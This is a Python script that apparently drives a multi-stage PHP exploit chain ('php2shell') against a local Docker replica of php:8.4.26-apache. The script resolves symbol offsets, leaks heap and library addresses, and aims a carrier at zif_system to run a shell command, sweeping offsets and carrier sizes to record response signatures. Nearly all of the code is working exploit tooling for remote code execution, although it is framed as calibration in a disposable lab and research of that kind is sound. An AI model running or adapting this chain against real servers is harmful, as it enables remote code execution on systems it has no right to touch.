#!/usr/bin/env python3
"""Signature calibration on the KNOWN-GOOD 8.4.26 build.

Question this answers: when the carrier lands on the dangling reference but
the aimed HTDATA is wrong (or the carrier size class is wrong), what does the
response signature look like?  That baseline is what makes 8.3.35's
"always empty/abort" signature interpretable.

Local disposable container only.
"""
from __future__ import annotations

import json
import os
import re
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

IMAGE = "php:8.4.26-apache"
PORT = 8093
NAME = "p2s-sig-8426"
PROFILE = os.path.join(LAB, "profiles-ours", "8.4.26-bookworm-amd64.json")


def start() -> tuple[str, str]:
    M.docker("rm", "-f", NAME)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", NAME))
    M.docker(
        "run", "-d", "--name", NAME,
        "-p", f"127.0.0.1:{PORT}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        IMAGE, timeout=900,
    )
    url = f"http://127.0.0.1:{PORT}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    return url, outdir


def sig_of(ex) -> str:
    raw = getattr(ex, "last3", b"") or b""
    if not raw:
        return "empty/abort"
    head = raw.partition(b"\r\n\r\n")[0]
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    return "%s/%d" % (m.group(1).decode() if m else "?", len(raw))


def attempt(ex, chunk, lib, zif, off, clen, proof):
    if os.path.exists(proof):
        os.unlink(proof)
    os.environ["P2S_CARRIER_LEN"] = str(clen)
    ex.stage3_carrier = True
    ex.stage3_pads = [(31, 31)] * 6
    try:
        ex.rotate()
        ex.stage3(chunk + off, lib + zif)
        return sig_of(ex)
    except Exception as exc:
        return f"exc:{type(exc).__name__}: {exc}"


def main() -> int:
    with open(PROFILE, encoding="utf-8") as fh:
        prof = json.load(fh)
    st = prof["stages"]
    hints = {"stage1_n": st["stage1_n"], "stage1_len": st["stage1_forge_len"],
             "stage2_t": st["stage2_t"], "stage2_v": st["stage2_v"]}

    url, outdir = start()
    proof = os.path.join(outdir, "p1")

    sym = C.extract_symbols(VENDOR, NAME)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                     verbose=False)
    print(f"[*] zif={hex(sym['zif_system'])} dtor={hex(sym['zval_ptr_dtor'])}")

    chunk, n, flen = C.calibrate_stage1(mod, ex, hints)
    if not chunk:
        print("[!] stage-1 failed")
        M.docker("rm", "-f", NAME)
        return 2
    lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], hints)
    if not lib:
        print("[!] stage-2 failed")
        M.docker("rm", "-f", NAME)
        return 2
    print(f"[*] chunk={hex(chunk)} libphp={hex(lib)}")

    results = []
    base = 0x690D8

    # 1) sanity: the known-good aim must give a proof
    s = attempt(ex, chunk, lib, sym["zif_system"], base, 15, proof)
    ok = os.path.exists(proof) and os.path.getsize(proof) > 0
    out = open(proof).read().strip() if ok else ""
    print(f"[sanity] clen=15 off={hex(base)} -> {s} proof={out!r}")
    results.append({"clen": 15, "off": hex(base), "sig": s, "proof": out})

    # 2) wrong aims around the good one (carrier size class kept)
    for d in (8, 16, 32, 64, 128, 256, 512, 1024, 4096, 16384, 0x20000):
        for off in (base - d, base + d) if d else (base,):
            s = attempt(ex, chunk, lib, sym["zif_system"], off, 15, proof)
            ok = os.path.exists(proof) and os.path.getsize(proof) > 0
            print(f"[aim]  clen=15 off={hex(off)} -> {s} proof={ok}")
            results.append({"clen": 15, "off": hex(off), "sig": s,
                            "proof": open(proof).read().strip() if ok else ""})

    # far-off aim still inside the chunk
    for off in (base + 0x100000, base - 0x40000):
        s = attempt(ex, chunk, lib, sym["zif_system"], off, 15, proof)
        ok = os.path.exists(proof) and os.path.getsize(proof) > 0
        print(f"[far]  clen=15 off={hex(off)} -> {s} proof={ok}")
        results.append({"clen": 15, "off": hex(off), "sig": s,
                        "proof": open(proof).read().strip() if ok else ""})

    # 3) wrong carrier size class at the right aim
    for clen in (16, 32):
        s = attempt(ex, chunk, lib, sym["zif_system"], base, clen, proof)
        ok = os.path.exists(proof) and os.path.getsize(proof) > 0
        print(f"[clen] clen={clen} off={hex(base)} -> {s} proof={ok}")
        results.append({"clen": clen, "off": hex(base), "sig": s,
                        "proof": open(proof).read().strip() if ok else ""})

    with open(os.path.join(LAB, "logs", "sig-8.4.26.json"), "w",
              encoding="utf-8") as fh:
        json.dump({"chunk": hex(chunk), "libphp": hex(lib),
                   "zif": hex(sym["zif_system"]), "results": results},
                  fh, indent=2)
    print("[*] wrote logs/sig-8.4.26.json")
    M.docker("rm", "-f", NAME)
    return 0


if __name__ == "__main__":
    sys.exit(main())
